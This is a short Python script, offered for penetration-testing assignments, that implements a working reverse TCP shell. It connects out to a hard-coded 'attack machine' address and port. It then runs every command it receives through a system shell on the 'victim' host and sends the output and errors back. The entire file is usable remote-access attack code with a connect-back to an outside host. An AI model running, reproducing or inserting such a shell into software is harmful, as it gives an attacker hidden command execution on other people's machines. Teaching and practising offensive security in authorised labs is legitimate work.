# Reverse TCP Shell in Python For Offensive Security/Penetration Testing Assignments 
# Connect on LinkedIn  https://www.linkedin.com/in/lismore or Twitter @patricklismore
#=======================================================================================================================================================================

# Python TCP Client

import socket
import subprocess

#Start client function

def startClient():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # create the socket object 'sock' 
    sock.connect(('192.168.1.95', 5000))                            # Replace the IP and listening port to your attack machine
 
    while True:                                                     # start an infinite loop
        sentCommand =  sock.recv(1024)                              # read the 1st KB of the tcp socket
        
        if 'terminate' in sentCommand:                              # if we get a termiante string from the attack machine then we will close the socket, end the loop
            sock.close()
            break 
        
        else:                                                       # or else, the sent command gets sent to the victim shell process
            
            CMD =  subprocess.Popen(sentCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            
            sock.send( CMD.stdout.read()  )                         # return shell result
            sock.send( CMD.stderr.read()  )                         # return any shell errors

#Main function
            
def main ():
    startClient()

#Program entry point
    
main()
